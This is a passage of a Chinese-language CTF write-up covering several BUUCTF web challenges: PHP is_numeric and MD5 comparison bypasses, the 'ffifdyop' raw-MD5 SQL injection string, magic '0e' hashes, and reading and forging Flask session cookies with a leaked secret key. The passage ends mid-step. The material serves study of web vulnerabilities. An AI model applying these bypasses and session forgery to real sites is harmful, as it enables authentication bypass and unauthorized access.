<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">	~~~post money and password~~~</span><br><span class="hljs-comment">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="hljs-comment">	$password = $_POST[&#x27;password&#x27;];</span><br><span class="hljs-comment">	if (is_numeric($password)) &#123;</span><br><span class="hljs-comment">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="hljs-comment">	&#125;elseif ($password == 404) &#123;</span><br><span class="hljs-comment">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="hljs-comment">	&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>
<p>使用POST传参，传入password和money，并且也提示了相关条件：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">1. You must be a student from CUIT!!!<br>2. You must be answer the correct password!!!<br>3. 必须有100000000money<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>抓包修改：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745402059483.png" srcset="/img/loading.gif" lazyload alt="1745402059483">这里将Cookie中的user设为1，符合条件1；</p>
<p>同时，在密码<code>404</code>后面加<code>%00</code>，来绕过我们上述说的is_numeric()函数：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">isnumeric( )函数绕过：<br><br>可以借助url编码中的空字符，例如<span class="hljs-comment">%00或者%20，其中%00加在数值前面或者后面都可以，也就是%00404或者404%00这样，将%20加在数值末尾也可以绕过，比如404%20。</span><br><br>数字-&gt;非数字：<br>数值<span class="hljs-comment">%20</span><br><span class="hljs-comment">%00数值</span><br>数值<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure>
<p>最后，如果直接上传<code>money=100000000</code>会包数字长度过长，我们使用<strong>科学计数法</strong>来绕过这种限制。</p>
<h2 id="BJDCTF2020-Easy-MD5">[BJDCTF2020]Easy MD5</h2>
<ol>
<li>输入任意值提交后，查看发送的包的响应，存在sql查询语句：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745414466502.png" srcset="/img/loading.gif" lazyload alt="1745414466502"></p>
<ol start="2">
<li>函数<code>md5(s,raw)</code>绕过，该函数的解释如下：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">s：表示需要加密的字符串。<br>raw：<br>TRUE-原始 16字符二进制格式。<br>FALSE-默认 32字符十六进制数。<br><br>e.g.<br>md5(&quot;hello&quot;)          // 输出: &quot;5d41402abc4b2a76b9719d911017c592&quot; （hex字符串）<br>md5(&quot;hello&quot;, true)    // 输出: 上述hex字符串当作16进制数后转字符串<br></code></pre></td></tr></table></figure>
<p>这里如果md5值经过hex转成字符串后为’‘+or+’(!0)xxxx’这样的字符串，即拼接后构成的SQL语句为：可实现绕过md5校验。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;(!0)xxxx&#x27;</span><br></code></pre></td></tr></table></figure>
<p>使用脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;;) &#123;<br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">1000000</span>; <span class="hljs-variable">$c</span>++, <span class="hljs-variable">$i</span>++)<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)   <span class="hljs-comment">#匹配&#x27;or&#x27;的形式</span><br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>e.g.</p>
<p>这里提供一个最常用的：ffifdyop，该字符串md5加密后若raw参数为True时会返回 <code>'or'6xxx</code>，后端SQL会<strong>自动补全外围引号</strong>，查询语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;6xxxx&#x27;</span>           <span class="hljs-comment">---&gt;  True</span><br></code></pre></td></tr></table></figure>
<p>具体过程如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">md5(ffifdyop)：276F722736C95D99E921722CF9ED621C<br>-&gt;(上述16为字符转字符串)<br>&#x27;or&#x27;6ɝ⬹�<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>弱类型比较绕过，题目代码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))&#123;   <span class="hljs-comment">#弱比较</span><br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br>--&gt;<br></code></pre></td></tr></table></figure>
<p>上述的题目也遇见过，如果<strong>比较一个数字和字符串</strong>，则<strong>字符串会被转换成数字</strong>并且比较按照数字来进行；</p>
<p><strong>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。</strong></p>
<p>一批md5开头是0e的字符串：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs tex">QNKCDZO<br>0e830400451993494058024219903391<br><br>s878926199a<br>0e545993274517709034328855841020<br>  <br>s155964671a<br>0e342768416822451524974117254469<br>  <br>s214587387a<br>0e848240448830537924465865611904<br>  <br>s214587387a<br>0e848240448830537924465865611904<br>  <br>s878926199a<br>0e545993274517709034328855841020<br>  <br>s1091221200a<br>0e940624217856561557816327384675<br>  <br>s1885207154a<br>0e509367213418206700842008763514<br><br><span class="hljs-comment">%数字</span><br>240610708<br></code></pre></td></tr></table></figure>
<ol start="4">
<li>md5强比较绕过：</li>
</ol>
<p><strong>MD5有个特点是：如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等</strong></p>
<p>传入数组，payload如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745420832110.png" srcset="/img/loading.gif" lazyload alt="1745420832110"></p>
<h2 id="HCTF-2018-admin">[HCTF 2018]admin</h2>
<h3 id="flask-session伪造">flask session伪造</h3>
<ol>
<li>首先阅读源码，发现<code>login</code>和<code>register</code>两个页面，并且提示需要是<code>admin</code>：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745488420160.png" srcset="/img/loading.gif" lazyload alt="1745488420160"></p>
<ol start="2">
<li>尝试注册<code>admin</code>账号，提示用户名已被占用，注册普通账号，检查每一个页面的源码：在<code>change password</code>页面发现网站源码：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745488680907.png" srcset="/img/loading.gif" lazyload alt="1745488680907"></p>
<ol start="3">
<li>下载阅读，首先阅读路由，实现了生成验证码，登录，注册，登出，修改密码，编辑的功能，在首页<code>index.html</code>,发现只要session[‘name’] == ‘admin’，可获得flag</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745489429373.png" srcset="/img/loading.gif" lazyload alt="1745489429373"></p>
<ol start="4">
<li>在伪造session前，我们先了解一下flask session是如何生成的：</li>
</ol>
<p>首先客户端session是用来进行用户身份认证的，采用签名算法而不是加密，可以防止用户进行数据篡改，但无法防止用户进行读取。</p>
<h4 id="flask-session读取">flask session读取</h4>
<p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">https://www.leavesongs.com/PENETRATION/client-session-security.html#</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureCookieSessionInterface</span>(<span class="hljs-title class_ inherited__">SessionInterface</span>):<br><br>    salt = <span class="hljs-string">&#x27;cookie-session&#x27;</span>     <span class="hljs-comment">#签名盐值</span><br>    digest_method = <span class="hljs-built_in">staticmethod</span>(hashlib.sha1)  <span class="hljs-comment">#所用hash算法</span><br>    key_derivation = <span class="hljs-string">&#x27;hmac&#x27;</span>           <span class="hljs-comment">#派生签名密钥的方式</span><br>    serializer = session_json_serializer   <span class="hljs-comment">#用于将会话数据序列化/反序列化的对象</span><br>    session_class = SecureCookieSession    <span class="hljs-comment">#会话数据结构</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_signing_serializer</span>(<span class="hljs-params">self, app</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> app.secret_key:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        signer_kwargs = <span class="hljs-built_in">dict</span>(<br>            key_derivation=<span class="hljs-variable language_">self</span>.key_derivation,<br>            digest_method=<span class="hljs-variable language_">self</span>.digest_method<br>        )<br>        <span class="hljs-keyword">return</span> URLSafeTimedSerializer(app.secret_key, salt=<span class="hljs-variable language_">self</span>.salt,<br>                                      serializer=<span class="hljs-variable language_">self</span>.serializer,<br>                                      signer_kwargs=signer_kwargs)  <span class="hljs-comment">#创建一个签名序列化器</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_session</span>(<span class="hljs-params">self, app, request</span>):<br>        s = <span class="hljs-variable language_">self</span>.get_signing_serializer(app)<br>        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        val = request.cookies.get(app.session_cookie_name) <span class="hljs-comment">#获取 cookie 名</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> val:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session_class()<br>        max_age = total_seconds(app.permanent_session_lifetime)<br>        <span class="hljs-keyword">try</span>:    <span class="hljs-comment">#校验签名，若通过就构造 SecureCookieSession，否则返回空会话</span><br>            data = s.loads(val, max_age=max_age)   <span class="hljs-comment">#使用签名序列化器反序列化 cookie</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session_class(data)<br>        <span class="hljs-keyword">except</span> BadSignature:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session_class()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_session</span>(<span class="hljs-params">self, app, session, response</span>): <span class="hljs-comment">#将会话数据序列化、签名并写入响应的 cookie 中</span><br>        domain = <span class="hljs-variable language_">self</span>.get_cookie_domain(app)<br>        path = <span class="hljs-variable language_">self</span>.get_cookie_path(app)<br>        <span class="hljs-comment"># Delete case. If there is no session we bail early.</span><br>        <span class="hljs-comment"># If the session was modified to be empty we remove the</span><br>        <span class="hljs-comment"># whole cookie.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>            <span class="hljs-keyword">if</span> session.modified:<br>                response.delete_cookie(app.session_cookie_name,<br>                                       domain=domain, path=path)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># Modification case. There are upsides and downsides to</span><br>        <span class="hljs-comment"># emitting a set-cookie header each request. The behavior</span><br>        <span class="hljs-comment"># is controlled by the :meth:`should_set_cookie` method</span><br>        <span class="hljs-comment"># which performs a quick check to figure out if the cookie</span><br>        <span class="hljs-comment"># should be set or not. This is controlled by the</span><br>        <span class="hljs-comment"># SESSION_REFRESH_EACH_REQUEST config flag as well as</span><br>        <span class="hljs-comment"># the permanent flag on the session itself.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.should_set_cookie(app, session):<br>            <span class="hljs-keyword">return</span><br>        httponly = <span class="hljs-variable language_">self</span>.get_cookie_httponly(app)<br>        secure = <span class="hljs-variable language_">self</span>.get_cookie_secure(app)<br>        expires = <span class="hljs-variable language_">self</span>.get_expiration_time(app, session)<br>        val = <span class="hljs-variable language_">self</span>.get_signing_serializer(app).dumps(<span class="hljs-built_in">dict</span>(session))   <span class="hljs-comment">#生成session值</span><br>        response.set_cookie(app.session_cookie_name, val,<br>                            expires=expires, httponly=httponly,<br>                            domain=domain, path=path, secure=secure)<br></code></pre></td></tr></table></figure>
<p>这里<code>val = self.get_signing_serializer(app).dumps(dict(session)) </code>生成了session值，新建了<code>URLSafeTimedSerializer</code>类，用它的<code>dumps</code>方法将类型为字典的session对象序列化成字符串。</p>
<p><code>URLSafeTimedSerializer</code>的具体做法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Signer</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sign</span>(<span class="hljs-params">self, value</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Signs the given string.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> value + want_bytes(<span class="hljs-variable language_">self</span>.sep) + <span class="hljs-variable language_">self</span>.get_signature(value)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_signature</span>(<span class="hljs-params">self, value</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;</span><br>        value = want_bytes(value)<br>        key = <span class="hljs-variable language_">self</span>.derive_key()<br>        sig = <span class="hljs-variable language_">self</span>.algorithm.get_signature(key, value)<br>        <span class="hljs-keyword">return</span> base64_encode(sig)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Serializer</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    default_serializer = json<br>    default_signer = Signer<br>    <span class="hljs-comment"># ....</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dumps</span>(<span class="hljs-params">self, obj, salt=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Returns a signed string serialized with the internal serializer.</span><br><span class="hljs-string">        The return value can be either a byte or unicode string depending</span><br><span class="hljs-string">        on the format of the internal serializer.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        payload = want_bytes(<span class="hljs-variable language_">self</span>.dump_payload(obj))<br>        rv = <span class="hljs-variable language_">self</span>.make_signer(salt).sign(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.is_text_serializer:<br>            rv = rv.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> rv<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dump_payload</span>(<span class="hljs-params">self, obj</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Dumps the encoded object. The return value is always a</span><br><span class="hljs-string">        bytestring. If the internal serializer is text based the value</span><br><span class="hljs-string">        will automatically be encoded to utf-8.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> want_bytes(<span class="hljs-variable language_">self</span>.serializer.dumps(obj))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">URLSafeSerializerMixin</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Mixed in with a regular serializer it will attempt to zlib compress</span><br><span class="hljs-string">    the string to make it shorter if necessary. It will also base64 encode</span><br><span class="hljs-string">    the string so that it can safely be placed in a URL.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_payload</span>(<span class="hljs-params">self, payload</span>):<br>        decompress = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>            payload = payload[<span class="hljs-number">1</span>:]<br>            decompress = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">try</span>:<br>            json = base64_decode(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> BadPayload(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                <span class="hljs-string">&#x27;an exception&#x27;</span>, original_error=e)<br>        <span class="hljs-keyword">if</span> decompress:<br>            <span class="hljs-keyword">try</span>:<br>                json = zlib.decompress(json)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">raise</span> BadPayload(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                    <span class="hljs-string">&#x27;decoding the payload&#x27;</span>, original_error=e)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>(URLSafeSerializerMixin, <span class="hljs-variable language_">self</span>).load_payload(json)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dump_payload</span>(<span class="hljs-params">self, obj</span>):<br>        json = <span class="hljs-built_in">super</span>(URLSafeSerializerMixin, <span class="hljs-variable language_">self</span>).dump_payload(obj)<br>        is_compressed = <span class="hljs-literal">False</span><br>        compressed = zlib.compress(json)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(compressed) &lt; (<span class="hljs-built_in">len</span>(json) - <span class="hljs-number">1</span>):<br>            json = compressed<br>            is_compressed = <span class="hljs-literal">True</span><br>        base64d = base64_encode(json)<br>        <span class="hljs-keyword">if</span> is_compressed:<br>            base64d = <span class="hljs-string">b&#x27;.&#x27;</span> + base64d<br>        <span class="hljs-keyword">return</span> base64d<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">URLSafeTimedSerializer</span>(URLSafeSerializerMixin, TimedSerializer):<br>    <span class="hljs-string">&quot;&quot;&quot;Works like :class:`TimedSerializer` but dumps and loads into a URL</span><br><span class="hljs-string">    safe string consisting of the upper and lowercase character of the</span><br><span class="hljs-string">    alphabet as well as ``&#x27;_&#x27;``, ``&#x27;-&#x27;`` and ``&#x27;.&#x27;``.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    default_serializer = compact_json<br></code></pre></td></tr></table></figure>
<p>主要看<code>URLSafeSerializerMixin</code>类的dump_payload()，具体做法如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">1. json.dumps 将原始数据转换成json字符串(进行序列化)，作为数据<br>2. 如果数据压缩后长度更短，则用zlib库进行压缩(),标志是以b.开头<br>3. 将数据用base64编码<br>4. 通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割<br></code></pre></td></tr></table></figure>
<p>flask session的大致结构如下：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&lt;base64<span class="hljs-built_in">_</span>payload&gt;.&lt;timestamp&gt;.&lt;signature&gt;<br></code></pre></td></tr></table></figure>
<p>于是可以通过下列的方式得到原始数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-comment">#分割</span><br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)   <br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>	<br>    <span class="hljs-comment">#判断是否压缩</span><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br>	<br>    <span class="hljs-comment">#base64解码</span><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br>	<span class="hljs-comment">#如果压缩最后进行解压缩</span><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></td></tr></table></figure>
<p>以上方法可以实现数据读取，如下图：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745498554714.png" srcset="/img/loading.gif" lazyload alt="1745498554714"></p>
<p>但要伪造session，必须要知道secret_key，在<code>config.py</code>中找到了密钥：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745497690754.png" srcset="/img/loading.gif" lazyload alt="1745497690754"></p>
<ol start="5">
<li>利用secret_key构造我们需要的session:</li>
</ol>
<h4 id="session-伪造">session 伪造</h4>
<p>首先修改明文payload，根据上述读取的内容进行修改：</p>
